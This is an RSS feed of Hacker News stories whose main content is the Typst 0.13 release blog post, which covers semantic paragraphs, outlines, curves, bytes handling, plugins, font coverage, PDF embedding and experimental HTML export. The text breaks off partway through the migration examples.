<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 20 Feb 2025 00:30:13 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[1972 Unix V2 "Beta" Resurrected (137 pts)]]></title>
            <link>https://www.tuhs.org/pipermail/tuhs/2025-February/031420.html</link>
            <guid>43108091</guid>
            <pubDate>Wed, 19 Feb 2025 21:41:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tuhs.org/pipermail/tuhs/2025-February/031420.html">https://www.tuhs.org/pipermail/tuhs/2025-February/031420.html</a>, See on <a href="https://news.ycombinator.com/item?id=43108091">Hacker News</a></p>
Couldn't get https://www.tuhs.org/pipermail/tuhs/2025-February/031420.html: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Typst 0.13 is out now (220 pts)]]></title>
            <link>https://typst.app/blog/2025/typst-0.13/</link>
            <guid>43105444</guid>
            <pubDate>Wed, 19 Feb 2025 18:22:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://typst.app/blog/2025/typst-0.13/">https://typst.app/blog/2025/typst-0.13/</a>, See on <a href="https://news.ycombinator.com/item?id=43105444">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><strong><p>With Typst 0.13, we wanted to improve the day-to-day experience of using Typst. We fixed some of the most long-standing bugs and made Typst even more flexible to use. And on top, we're shipping a first, experimental version of HTML export. </p></strong></p></div><p>It's been almost two years since Typst's open-source launch and the project has matured quite a bit since then. Typst 0.12's development cycle saw many large-scale changes to Typst's foundations. With Typst 0.13, we moved the focus to the day-to-day experience of using Typst. We made quality-of-life improvements all across and fixed some of the biggest paper cuts. But, of course, we also shipped some exciting new features!</p> <h2 id="contents">Contents</h2> <p>In this blog post, I'll walk you through the highlights of the release. If you prefer a more visual take on the topic, also check out the <a href="https://youtu.be/3OrrMzOCXfY">release video</a>.</p> <ul> <li><a href="#paragraphs-and-first-line-indent">Paragraphs and first line indent</a></li> <li><a href="#better-looking-outlines">Better-looking outlines</a></li> <li><a href="#new-curves">New curves</a></li> <li><a href="#files-and-bytes">Files and bytes</a></li> <li><a href="#generating-images">Generating images</a></li> <li><a href="#faster-plugins">Faster plugins</a></li> <li><a href="#single-letter-strings-in-math">Single-letter strings in math</a></li> <li><a href="#font-coverage-control">Font coverage control</a></li> <li><a href="#pdf-file-embedding">PDF file embedding</a></li> <li><a href="#a-first-look-at-html-export">A first look at HTML export</a></li> <li><a href="#migrating">Migrating to Typst 0.13</a></li> <li><a href="#community-call">Community Call</a></li> </ul> <p>For a comprehensive overview of all changes in the release, visit the <a href="https://typst.app/docs/changelog/0.13.0/">changelog</a>. If you're looking to upgrade your document to Typst 0.13, you can also skip ahead to the <a href="#migrating">Migration section</a>.</p> <h2 id="paragraphs-and-first-line-indent">Paragraphs and first-line indent</h2> <p>The work on <em>semantic paragraphs</em> is what I'm most proud of in this release, but at the same time it's among the things that are least visible for users. What do I even mean with "semantic paragraphs?"</p> <p>Let me explain. Up until now, Typst considered <em>every</em> piece of text you wrote as a paragraph — be it a single word in a page header, a figure caption, or a page number. Just like paragraphs, these things can have spacing, break across lines, etc. Layout-wise they are not all that different from paragraphs.</p> <p>However, there <em>are</em> semantical differences. Only proper paragraphs should be counted when paragraphs are numbered (such as in legal texts). Only proper paragraphs should be announced by a screen reader as such. And even layout-wise there are differences; for instance, that only proper paragraphs should have first-line indent. While the layout routines for "just text" and a paragraph may be very similar, the second order effects of something being a proper paragraph are far-reaching.</p> <p>In version 0.13, Typst finally gains a better understanding of this distinction. Whether something is a paragraph or just text is decided based on a few simple rules about which you can read in the <a href="https://typst.app/docs/reference/model/par/#what-becomes-a-paragraph">updated paragraph documentation</a>.</p> <p>The most visible immediate effect of this work is that <a href="https://typst.app/docs/reference/model/par/#parameters-first-line-indent"><code>first-line-indent</code></a> can now be applied to all paragraphs instead of just consecutive ones, closing the most upvoted Typst bug. Semantic paragraphs are also crucial for the in-development HTML export and for planned future work on PDF accessibility.</p> <div><pre><code><span>#</span><span>set</span> <span>block</span><span>(</span>spacing<span>:</span> <span>1.2em</span><span>)</span>
<span>#</span><span>set</span> <span>par</span><span>(</span>
  spacing<span>:</span> <span>0.65em</span><span>,</span>
  first-line-indent<span>:</span> <span>(</span>
    amount<span>:</span> <span>1em</span><span>,</span>
    all<span>:</span> <span>true</span><span>,</span>
  <span>)</span><span>,</span>
<span>)</span>

<span>= Chapter 1</span>
In this text, the paragraphs are
all indented, without exception.

With <span>`all: true`</span>, the first
paragraph is affected as well.
</code></pre><p><img src="https://typst.app/assets/docs/Ito7W1rtJK8ycLVOaR8N9AAAAAAAAAAA.png" alt="Preview" width="480" height="197"></p></div> <h2 id="better-looking-outlines">Better-looking outlines</h2> <p>If you've created a table of contents with Typst's <a href="https://typst.app/docs/reference/model/outline/" title="outline">outline</a> functionality before, you might remember that it always looked a bit bland. The default style had no indentation and rather tightly dotted leaders (leaders are the filler dots between a title and its page number).</p> <p>In Typst 0.13, the outline gets a full facelift while also becoming easier to customize. The new automatic indentation nicely aligns all titles and numberings across the whole outline, long titles have better-looking wrapping behavior, and we fixed a number of bugs.</p> <p>If you have a customized outline, check out the <a href="#outline-migration">migration section for the outline</a> to learn how to adapt your customization.</p> <div><pre><code><span>#</span><span>set</span> <span>heading</span><span>(</span>numbering<span>:</span> <span>"1.i."</span><span>)</span>

<span>#</span><span>outline</span><span>(</span><span>)</span>

<span>= Introduction</span>
<span>= Methods</span>
<span>== Experiments</span>
<span>== Statistics</span>
<span>= Results</span>
<span>== T Experiment</span>
<span>== K Experiment</span>
<span>== V Experiment</span>
<span>== Additional experiments with extra length</span>
<span>= Discussion</span>
<span>= Conclusion</span>
</code></pre><p><img src="https://typst.app/assets/docs/1QgzdxrGkmOdZlAJlXu4HwAAAAAAAAAA.png" alt="Preview" width="480" height="427"></p></div> <h2 id="new-curves">New Curves</h2> <p>Since Typst 0.2, you could draw <a href="https://en.wikipedia.org/wiki/B%C3%A9zier_curve">Bézier paths</a> with the <code>path</code> function. However, the input format of this function was rather arcane. Rather than specifying pen movements as in an SVG, you had to specify directly points with their two control points. Moreover, the path function had a fatal flaw: You could not close a path and then keep on drawing. This is necessary to draw a shape with cutouts, as depicated below.</p> <p>The new <a href="https://typst.app/docs/reference/visualize/curve/" title="`curve`"><code>curve</code></a> function fixes these flaws. It provides an easier-to-understand and more expressive interface. We also used this opportunity to change the name from <code>path</code> to <code>curve</code> as we plan to repurpose the name <code>path</code> for a file path type in an upcoming release.</p> <div><pre><code><span>#</span><span>curve</span><span>(</span>
  fill<span>:</span> blue<span>.</span><span>lighten</span><span>(</span><span>80%</span><span>)</span><span>,</span>
  fill-rule<span>:</span> <span>"even-odd"</span><span>,</span>
  stroke<span>:</span> blue<span>,</span>
  curve<span>.</span><span>line</span><span>(</span><span>(</span><span>50pt</span><span>,</span> <span>0pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>line</span><span>(</span><span>(</span><span>50pt</span><span>,</span> <span>50pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>line</span><span>(</span><span>(</span><span>0pt</span><span>,</span> <span>50pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>close</span><span>(</span><span>)</span><span>,</span>
  curve<span>.</span><span>move</span><span>(</span><span>(</span><span>10pt</span><span>,</span> <span>10pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>line</span><span>(</span><span>(</span><span>40pt</span><span>,</span> <span>10pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>line</span><span>(</span><span>(</span><span>40pt</span><span>,</span> <span>40pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>line</span><span>(</span><span>(</span><span>10pt</span><span>,</span> <span>40pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>close</span><span>(</span><span>)</span><span>,</span>
<span>)</span>
</code></pre><p><img src="https://typst.app/assets/docs/GVXUaPSBZ9aLOPaKKVQbFgAAAAAAAAAA.png" alt="Preview" width="480" height="160"></p></div> <p>Thanks to <a href="https://github.com/Emm54321">@Emm54321</a> for working on this!</p> <h2 id="files-and-bytes">Files and bytes</h2> <p>Various functions in Typst load files, be it <a href="https://typst.app/docs/reference/visualize/image/">images</a>, <a href="https://typst.app/docs/reference/data-loading/">data loading functions</a>, or <a href="https://typst.app/docs/reference/foundations/plugin/">plugins</a>. Sometimes though, a little extra flexibility is needed, for example, to preprocess, generate, or inline data into a Typst document.</p> <p>For this reason, there are also <code>.decode</code> variants on various of the functions, e.g. <code>image.decode</code> or <code>json.decode</code>. However, that approach didn't work so well when a path is expected in a set rule, as in <code><span>set</span> <span>raw</span><span>(</span>theme<span>:</span> <span>"light.tmTheme"</span><span>)</span></code>. It also introduced duplication: All the properties of an image are also spelled out again in <code>image.decode</code>.</p> <p>Typst 0.13 revamps file handling to improve this unsatisfactory situation. All places where a path is expected now also support raw <a href="https://typst.app/docs/reference/foundations/bytes/" title="bytes">bytes</a> instead. Typst will always interpret a string as a path and raw bytes as data. When trying to decode an image from a string, thus make sure to first convert it to bytes. Converting to bytes is cheap as Typst will internally reuse the memory from the string. It will even remember that the bytes came from a string to make conversions back to a string cheap as well!</p> <p>The existing <code>.decode</code> functions are now deprecated as they are not needed anymore. The <code>.encode</code> variants of data loading functions remain unchanged.</p> <div><pre><code>See <span>@netwok</span> for details.

<span>#</span><span>bibliography</span><span>(</span><span>bytes</span><span>(</span>
  <span>```bib
  @article{netwok,
    title={At-scale impact of the {Net Wok}},
    author={Astley, Rick and Morris, Linda},
    journal={Armenian Journal of Proceedings},
    volume={61},
    pages={192--219},
    year={2020},
    publisher={Automattic Inc.}
  }
  ```</span><span>.</span>text
<span>)</span><span>)</span>
</code></pre><p><img src="https://typst.app/assets/docs/cxF_vKeQ4I6gnlWEz2KkSgAAAAAAAAAA.png" alt="Preview" width="480" height="222"></p></div> <h2 id="generating-images">Generating images</h2> <p>With the new byte-taking <code>image</code> function (and previously <code>image.decode</code>), you can generate images at runtime. However, the image function expects images in an encoded image exchange format like PNG or JPEG. Producing valid bytes for such a format in pure Typst code is prohibitively complicated. Meanwhile, plugins are unnecessarily bloated and slowed down if they have to include an image encoder.</p> <p>To streamline image generation workflows, Typst 0.13 thus brings support for loading images from uncompressed raw pixel data. To that end, the <a href="https://typst.app/docs/reference/visualize/image/#parameters-format"><code>format</code></a> parameter of the image function supports a new form, where the channel encoding and pixel width/height of the image can be specified. This feature is crucial for better scientific visualizations — think things like heatmaps.</p> <div><pre><code><span>#</span><span>image</span><span>(</span>
  <span>bytes</span><span>(</span><span>range</span><span>(</span><span>64</span><span>)</span><span>.</span><span>map</span><span>(</span>x <span>=&gt;</span> x <span>*</span> <span>4</span><span>)</span><span>)</span><span>,</span>
  format<span>:</span> <span>(</span>
    encoding<span>:</span> <span>"luma8"</span><span>,</span>
    width<span>:</span> <span>8</span><span>,</span>
    height<span>:</span> <span>8</span><span>,</span>
  <span>)</span><span>,</span>
  width<span>:</span> <span>4cm</span><span>,</span>
  scaling<span>:</span> <span>"pixelated"</span><span>,</span>
<span>)</span>
</code></pre><p><img src="https://typst.app/assets/docs/QY0gst4GDNzXJlUt9cfh1gAAAAAAAAAA.png" alt="Preview" width="480" height="287"></p></div> <p>Thanks to <a href="https://github.com/frozolotl">@frozolotl</a> for working on this!</p> <h2 id="faster-plugins">Faster plugins</h2> <p>In version 0.8, Typst gained support for WebAssembly plugins — one of the features that would very likely still be a little blue "feature request" label if not for our fabulous open source community. Since then, plugins have become the backbone of various community packages. They're great because they bring the power and package ecosystem of all the languages that compile to WebAssembly right into Typst.</p> <p>They are also faster to execute than Typst code. Still, with heavy usage the time spent executing plugin code can make up a significant chunk of compile time. A simple way to improve this would've been to switch to a faster WebAssembly runtime (specifically, from <code>wasmi</code> to <code>wasmtime</code>). However, taking on a dependency on a WebAssembly runtime with just-in-time compilation<sup><a href="#1">1</a></sup> wasn't a spot we wanted to put Typst into. It would have reduced portability and security and increased the amount of third-party code Typst depends on by a lot.</p> <p>There was another way to speed up plugins: Since 0.12, Typst's layout engine is multi-threaded. Plugins didn't profit from this though as they couldn't be easily replicated across threads. This is a limitation we're lifting with 0.13. Typst will now automatically run plugins in multiple threads without any changes from plugin authors. This is possible because we require (and also already required in the past) plugin functions to be <em>pure.</em> This means that we can execute plugin functions out of order without a visible effect. For cases where purity is too limiting, Typst 0.13 introduces the new <a href="https://typst.app/docs/reference/foundations/plugin/#definitions-transition"><code>plugin.transition</code> API</a>, which lets plugin authors deal with stateful operations in a sound way.</p> <p>The work on speeding up plugins was prioritized through a Typst open-source support contract. If you're using Typst in production at your company and are hitting any road blocks, <a href="https://typst.app/pricing/?oss-support#oss">please reach out to us!</a></p> <h2 id="single-letter-strings-in-math">Single-letter strings in math</h2> <p>Since Typst's initial release, <code><span>$</span> <span>"hi"</span> <span>$</span></code> would generate the letters "h" and "i" in upright style while <code><span>$</span> <span>"h"</span> <span>$</span></code> would result in an italic "h". It's one of the <a href="https://github.com/typst/typst/issues/274">longest-standing bugs</a>, which is curious because it <em>seems</em> so easy to fix. Unfortunately, it was not. To see why, we need to take a look behind the scenes and understand how Typst views your equations.</p> <p>In Typst 0.12 and lower, the <code>x</code> in <code><span>$</span> x <span>$</span></code> is a <a href="https://typst.app/docs/reference/text/text/" title="text">text</a> element like any other text in your document. A string like <code><span>"hi"</span></code> is converted to content by becoming such a text element, too. While different syntactically, <code><span>$</span> x <span>$</span></code> and <code><span>$</span> <span>"x"</span> <span>$</span></code> thus used to yield identical content. Since <code>x</code> becomes italic by default, <code><span>"x"</span></code> did, too.</p> <p>Changing that by itself wouldn't have been too hard, but there is a third guest to the party: Symbols. The <code>pi</code> in <code><span>$</span> <span>pi</span> <span>$</span></code> is a <a href="https://typst.app/docs/reference/foundations/symbol/">symbol value</a>. Like strings, symbols were up until now converted to content by becoming text elements. This means they work both in math and normal text (as <code><span>#</span><span>sym</span><span>.</span><span>pi</span></code>).</p> <p>For a long time, the issue was thus blocked on finding a general solution to the text element ambiguity — <a href="https://github.com/typst/typst/issues/1125">perhaps introducing a new <code>var</code> element for math-y text</a>. That story isn't fully written yet, but for 0.13 we really wanted to fix the issue at hand. For this reason, we attempted to find a minimal solution that fixes the issue while leaving our options for further improvements open.</p> <p>The solution we came up with: Bare letters and symbols are now converted into an internal <em>symbol element,</em> which has auto-italics in math, but is transparently converted to normal text outside of math. Meanwhile, strings still generate text elements. With the <a href="https://laurmaedje.github.io/posts/types-and-context/">planned unification of types and elements</a>, this symbol element and the existing symbol type will naturally merge into one.</p> <div><pre><code><span>$</span> a <span>!=</span> <span>"a"</span> <span>$</span>
</code></pre><p><img src="https://typst.app/assets/docs/f1OPgpaBY91FNLguvrxWTgAAAAAAAAAA.png" alt="Preview" width="480" height="81"></p></div> <p>Thanks to <a href="https://github.com/wrzian">@wrzian</a> for working on this!</p> <h2 id="font-coverage-control">Font coverage control</h2> <p>When text in different writing scripts is mixed, it's often important to have precise control over which text is typeset with which font. For example, Latin and Chinese text are almost always typeset with different fonts.</p> <p>This is quite problematic for CJK (Chinese, Japanese, Korean) Typst users which often have text that mix their native language and English. Typst 0.13 takes a first step to improve this situation. With the new <a href="https://typst.app/docs/reference/text/text/#parameters-font"><code>covers</code></a> functionality, users can specify precisely for which character ranges a font should be used. This can, for example, be used to define in which font punctuation (which is present in both Latin and CJK fonts) is rendered.</p> <p>The <code>covers</code> feature supports specifying a character set, either as a <a href="https://typst.app/docs/reference/foundations/regex/">regular expression</a> or one of the built-in ones. Currently, the only built-in set is <code><span>"latin-in-cjk"</span></code>, which should be specified for a Latin font that is <em>before</em> a CJK font in the fallback list. In the example below, we can put <em>Inria Serif</em> first in the fallback chain while still having quotes render with <em>Noto Serif CJK SC.</em></p> <div><pre><code><span>// Mix Latin and CJK fonts.</span>
<span>#</span><span>set</span> <span>text</span><span>(</span>font<span>:</span> <span>(</span>
  <span>(</span>
    name<span>:</span> <span>"Inria Serif"</span><span>,</span>
    covers<span>:</span> <span>"latin-in-cjk"</span><span>,</span>
  <span>)</span><span>,</span>
  <span>"Noto Serif CJK SC"</span>
<span>)</span><span>)</span>

分别设置“中文”和English字体
</code></pre><p><img src="https://typst.app/assets/docs/n0XdjS0M45oQzm2rUHUxxwAAAAAAAAAA.png" alt="Preview" width="480" height="76"></p></div> <p>Thanks to <a href="https://github.com/peng1999">@peng1999</a> for working on this!</p> <h2 id="pdf-file-embedding">PDF file embedding</h2> <p>With Typst 0.13's new <code>pdf.embed</code> function, you can attach arbitrary text or binary files to your PDF. These embedded files can then be browsed in PDF viewers or extracted programmatically by third-party tools.</p> <p>When is this useful? One example, electronic invoicing, is ever more important as new EU legislation just came into force. While electronic invoices are typically in XML-based formats, it's often useful to still have a human-readable and printable invoice.</p> <p>With PDF file embedding, the XML invoice data can be inserted into the PDF itself, forming a hybrid invoice. Currently, there is still one missing piece in Typst's support for this: The PDF metadata must identify the document as an E-Invoice to other applications. We plan to add support for embedding arbitrary metadata like this in a future Typst release.</p> <p>Thanks to <a href="https://github.com/NiklasEi">@NiklasEi</a> for working on this!</p> <h2 id="a-first-look-at-html-export">A first look at HTML export</h2> <p>Saved for last is a particularly exciting topic: We've been starting work on <a href="https://typst.app/docs/reference/html/">HTML export</a>! The feature is still very incomplete and only available for experimentation behind a feature flag, but there's already some stuff to see.</p> <h3 id="what-works">What works</h3> <p>Most of the markup and some of the other built-in functions like <code>figure</code> and <code>table</code> already produce the appropriate HTML. Our focus is on producing semantically rich HTML that retains the structure of the input document. The HTML output should be accessible, human-readable, and editable by hand.</p> <p>The Typst document below</p> <pre><code><span>= Introduction</span>
A <span>*document*</span> with some <span>_markup._</span>

<span>-</span> A list
<span>-</span> with elements

<span>#</span><span>figure</span><span>(</span>
  <span>[</span>A bit of text<span>]</span><span>,</span>
  caption<span>:</span> <span>[</span>My caption<span>]</span><span>,</span>
<span>)</span>
</code></pre> <p>will produce the following HTML output:</p> <pre><span>&lt;!-- html, head, and body omitted for brevity --&gt;
</span><span>&lt;</span><span>h2</span><span>&gt;Introduction&lt;/</span><span>h2</span><span>&gt;
</span><span>&lt;</span><span>p</span><span>&gt;A &lt;</span><span>strong</span><span>&gt;document&lt;/</span><span>strong</span><span>&gt; with some &lt;</span><span>em</span><span>&gt;markup.&lt;/</span><span>em</span><span>&gt;&lt;/</span><span>p</span><span>&gt;
</span><span>&lt;</span><span>ul</span><span>&gt;
</span><span>  &lt;</span><span>li</span><span>&gt;A list&lt;/</span><span>li</span><span>&gt;
</span><span>  &lt;</span><span>li</span><span>&gt;with elements&lt;/</span><span>li</span><span>&gt;
</span><span>&lt;/</span><span>ul</span><span>&gt;
</span><span>&lt;</span><span>figure</span><span>&gt;
</span><span>  &lt;</span><span>p</span><span>&gt;A bit of text&lt;/</span><span>p</span><span>&gt;
</span><span>  &lt;</span><span>figcaption</span><span>&gt;Figure&nbsp;1: My caption&lt;/</span><span>figcaption</span><span>&gt;
</span><span>&lt;/</span><span>figure</span><span>&gt;
</span></pre> <p>Typst cannot always produce the perfect HTML automatically. Instead, it gives you full control by letting you generate raw HTML elements:</p> <pre><code><span>#</span><span>html</span><span>.</span><span>elem</span><span>(</span>
  <span>"div"</span><span>,</span>
  attrs<span>:</span> <span>(</span>style<span>:</span> <span>"background: aqua"</span><span>)</span>
<span>)</span><span>[</span>
  A div with <span>_Typst content_</span> inside!
<span>]</span>
</code></pre><pre><span>&lt;</span><span>div </span><span>style</span><span>=</span><span>"</span><span>background</span><span>: </span><span>aqua</span><span>"</span><span>&gt;
</span><span>  A div with &lt;</span><span>em</span><span>&gt;Typst content&lt;/</span><span>em</span><span>&gt; inside!
</span><span>&lt;/</span><span>div</span><span>&gt;
</span></pre> <p>To make your document portable across PDF and HTML, we're also introducing a <a href="https://typst.app/docs/reference/foundations/target/" title="`target`"><code>target</code></a> function that returns the current export format (either <code><span>"paged"</span></code> or <code><span>"html"</span></code>). It is mainly intended for use in show rules, like below:</p> <div><pre><code><span>#</span><span>let</span> <span>kbd</span><span>(</span>it<span>)</span> <span>=</span> <span>context</span> <span>{</span>
  <span>if</span> <span>target</span><span>(</span><span>)</span> <span>==</span> <span>"html"</span> <span>{</span>
    html<span>.</span><span>elem</span><span>(</span><span>"kbd"</span><span>,</span> it<span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>set</span> <span>text</span><span>(</span>fill<span>:</span> <span>rgb</span><span>(</span><span>"#1f2328"</span><span>)</span><span>)</span>
    <span>let</span> r <span>=</span> <span>3pt</span>
    <span>box</span><span>(</span>
      fill<span>:</span> <span>rgb</span><span>(</span><span>"#f6f8fa"</span><span>)</span><span>,</span>
      stroke<span>:</span> <span>rgb</span><span>(</span><span>"#d1d9e0b3"</span><span>)</span><span>,</span>
      outset<span>:</span> <span>(</span>y<span>:</span> r<span>)</span><span>,</span>
      inset<span>:</span> <span>(</span>x<span>:</span> r<span>)</span><span>,</span>
      radius<span>:</span> r<span>,</span>
      <span>raw</span><span>(</span>it<span>)</span>
    <span>)</span>
  <span>}</span>
<span>}</span>

Press <span>#</span><span>kbd</span><span>(</span><span>"F1"</span><span>)</span> for help.
</code></pre><p><img src="https://typst.app/assets/docs/2e4T4KROGY3szMbBvSacdgAAAAAAAAAA.png" alt="Preview" width="480" height="74"></p></div><pre><span>&lt;</span><span>p</span><span>&gt;Press &lt;</span><span>kbd</span><span>&gt;F1&lt;/</span><span>kbd</span><span>&gt; for help.&lt;/</span><span>p</span><span>&gt;
</span></pre> <p>The <code>target</code> function is contextual because the export target can vary within one compilation. How? With the <a href="https://typst.app/docs/reference/html/frame/" title="`html.frame`"><code>html.frame</code></a> function, you can lay out part of your HTML document as an inline SVG, using Typst's normal layout engine. Within such a frame, the compilation target is <code><span>"paged"</span></code> again, so that show rules produce the appropriate layout elements instead of HTML elements.</p> <h3 id="what-s-missing">What's missing</h3> <p>A lot! For instance, currently, Typst will always output a single HTML file. Support for outputting directories with multiple HTML documents and assets, as well as support for outputting fragments that can be integrated into other HTML documents is planned.</p> <p>Typst currently also doesn't output any CSS, instead focusing fully on emitting semantic markup. You can of course write your own CSS styles and still benefit from sharing your content between PDF and HTML.</p> <p>In the future, we plan to give you the option of automatically emitting CSS, taking more of your existing set rules into account. More generally, we have a lot of plans for HTML export! Visit the <a href="https://github.com/typst/typst/issues/5512">tracking issue</a> to learn more about them.</p> <h3 id="try-it">Try it!</h3> <p>In the CLI, you can experiment with HTML export by passing <code>--features html</code> or setting the <code>TYPST_FEATURES</code> environment variable to <code>html</code>. In the web app, HTML export is not yet available. It will become available once we think it's ready for general use.</p> <p>You can also use HTML export with <code>typst watch</code>. Typst will then automatically spin up a live-reloading HTTP server that serves your document.</p> <pre><span>$</span><span> typst watch hi.typ --features html --format html --open
</span><span>
</span><span>watching</span><span> hi.typ
</span><span>writing</span><span> to hi.html
</span><span>serving</span><span> at http://127.0.0.1:3001
</span><span>
</span><span>[20:31:09]</span><span> compiled with warnings in 1.52 ms
</span></pre>  <p>Work on Typst's HTML export is sponsored by <a href="https://nlnet.nl/project/Typst-HTML/">NLNet</a>. We are very grateful for their support! We also want to thank external contributor <a href="https://github.com/01mf02">@01mf02</a> with whom we've thus far collaborated on HTML export through the NLNet grant. Unfortunately, we and him have since parted ways over technical differences. Nonetheless, we plan to increase the time and resources we put into HTML export, and we are very happy to have NLNet's continued support in this endeavor.</p> <h2 id="migrating">Migrating to Typst 0.13</h2> <p>Typst 0.13 ships with a number of deprecations and breaking changes. The <a href="https://typst.app/docs/changelog/0.13.0/">changelog</a> has a full account of all changes, but in this section you'll learn how to deal with the most common kinds of breakage.</p> <h3 id="type-string-compatibility">Type/string compatibility</h3> <p>In Typst 0.8, <a href="https://typst.app/docs/reference/foundations/type/">types</a> were promoted to proper values. As a result, <code><span>type</span><span>(</span><span>10</span><span>)</span></code> directly returns a type instead of a string since then. To make this change less disruptive, we also introduced a temporary compatibility behavior where types could be used like strings in some contexts (e.g., <code>int <span>==</span> <span>"integer"</span></code> would be true). For implementation reasons, we did not add a warning for this at the time. We're rectifying this now and adding a warning to shake out remaining reliance on this behavior. With Typst 0.14, the compatibility behavior will be fully removed.</p> <pre><code><span>// Typst 0.8+ ✅</span>
<span>#</span><span>{</span> <span>type</span><span>(</span><span>10</span><span>)</span> <span>==</span> int <span>}</span>

<span>// Typst 0.7 and below ⚠️</span>
<span>#</span><span>{</span> <span>type</span><span>(</span><span>10</span><span>)</span> <span>==</span> <span>"integer"</span> <span>}</span>
</code></pre> <h3 id="decode-migration">Decode functions</h3> <p>The <code>image.decode</code> function and the <code>.decode</code> variants of data loading functions are now deprecated. You can instead directly pass bytes to the respective top-level functions instead. Read the <a href="#files-and-bytes">section on files and bytes</a> to learn more.</p> <pre><code><span>// Typst 0.13+ ✅</span>
<span>#</span><span>image</span><span>(</span><span>bytes</span><span>(</span><span>"&lt;svg&gt;..&lt;/svg&gt;"</span><span>)</span><span>)</span>

<span>// Typst 0.12 and below ⚠️</span>
<span>#</span><span>image</span><span>.</span><span>decode</span><span>(</span><span>"&lt;svg&gt;..&lt;/svg&gt;"</span><span>)</span>
</code></pre> <h3 id="outline-migration">Outline</h3> <p>The changes to the built-in <a href="https://typst.app/docs/reference/model/outline/" title="outline">outline</a> (table of contents) improve the out-of-the-box style and customizability. Unfortunately, they also break some existing outline customizations.</p> <p>First of all, the <code>fill</code> argument moved from <code>outline</code> to <a href="https://typst.app/docs/reference/model/outline/#definitions-entry" title="`outline.entry`"><code>outline.entry</code></a>. If you get the error "unexpected argument: fill", adjust your code as shown below:</p> <pre><code><span>// Typst 0.13+ ✅</span>
<span>#</span><span>set</span> outline<span>.</span><span>entry</span><span>(</span>fill<span>:</span> <span>none</span><span>)</span>

<span>// Typst 0.12 and below ❌</span>
<span>#</span><span>set</span> <span>outline</span><span>(</span>fill<span>:</span> <span>none</span><span>)</span>
</code></pre> <p>Because the <code>fill</code> property is now on the entry, it can also be configured for individual outline levels, like this:</p> <pre><code><span>#</span><span>show</span> outline<span>.</span>entry<span>.</span><span>where</span><span>(</span>level<span>:</span> <span>1</span><span>)</span><span>:</span> <span>set</span> outline<span>.</span><span>entry</span><span>(</span>fill<span>:</span> <span>none</span><span>)</span>
</code></pre> <p>In light of the changes to paragraphs, outline entries now show themselves as <a href="https://typst.app/docs/reference/layout/block/">blocks</a> instead of lines of text. This means spacing is now configured via normal show-set rules for <a href="https://typst.app/docs/reference/layout/block/#parameters-spacing" title="`block.spacing`"><code>block.spacing</code></a>.</p> <pre><code><span>// Typst 0.13+ ✅</span>
<span>#</span><span>show</span> outline<span>.</span>entry<span>.</span><span>where</span><span>(</span>level<span>:</span> <span>1</span><span>)</span><span>:</span> <span>set</span> <span>block</span><span>(</span>below<span>:</span> <span>1em</span><span>)</span>

<span>// Typst 0.12 and below ⚠️</span>
<span>#</span><span>show</span> outline<span>.</span><span>entry</span><span>:</span> it <span>=&gt;</span> <span>{</span>
  it
  <span>v</span><span>(</span><span>1em</span><span>,</span> weak<span>:</span> <span>true</span><span>)</span>
<span>}</span>
</code></pre> <p>In Typst 0.12 and below, outline entries expose a few fields like <code>.body</code> and <code>.page</code> that are useful for writing an outline entry show rule. These fields were derived from other fields for your convenience. Typst 0.13 makes this more explicit and idiomatic by turning them into methods. Read the <a href="https://typst.app/docs/reference/model/outline/#building-an-entry">documentation on outline customization</a> for more details on how to use these methods.</p> <pre><code><span>// Typst 0.13+ ✅</span>
<span>#</span><span>show</span> outline<span>.</span><span>entry</span><span>:</span> it <span>=&gt;</span> <span>{</span>
  ...
  it<span>.</span><span>page</span><span>(</span><span>)</span>
<span>}</span>

<span>// Typst 0.12 and below ❌</span>
<span>#</span><span>show</span> outline<span>.</span><span>entry</span><span>:</span> it <span>=&gt;</span> <span>{</span>
  ...
  it<span>.</span>page
<span>}</span>
</code></pre> <h3 id="path-migration">Paths</h3> <p>The <code>path</code> function is superseded by the new <code>curve</code> function. The <code>curve</code> function has an easier-to-understand interface that's closer to how SVG and the HTML canvas work. Read the <a href="https://typst.app/docs/reference/visualize/curve/"><code>curve</code> function's documentation</a> to learn how to express existing paths with the new function.</p> <div><pre><code><span>// Typst 0.13+ ✅</span>
<span>#</span><span>curve</span><span>(</span>
  fill<span>:</span> blue<span>.</span><span>lighten</span><span>(</span><span>80%</span><span>)</span><span>,</span>
  stroke<span>:</span> blue<span>,</span>
  curve<span>.</span><span>move</span><span>(</span><span>(</span><span>0pt</span><span>,</span> <span>50pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>line</span><span>(</span><span>(</span><span>100pt</span><span>,</span> <span>50pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>cubic</span><span>(</span><span>none</span><span>,</span> <span>(</span><span>90pt</span><span>,</span> <span>0pt</span><span>)</span><span>,</span> <span>(</span><span>50pt</span><span>,</span> <span>0pt</span><span>)</span><span>)</span><span>,</span>
  curve<span>.</span><span>close</span><span>(</span><span>)</span><span>,</span>
<span>)</span>

<span>// Typst 0.12 and below ⚠️</span>
<span>#</span><span>path</span><span>(</span>
  fill<span>:</span> blue<span>.</span><span>lighten</span><span>(</span><span>80%</span><span>)</span><span>,</span>
  stroke<span>:</span> blue<span>,</span>
  closed<span>:</span> <span>true</span><span>,</span>
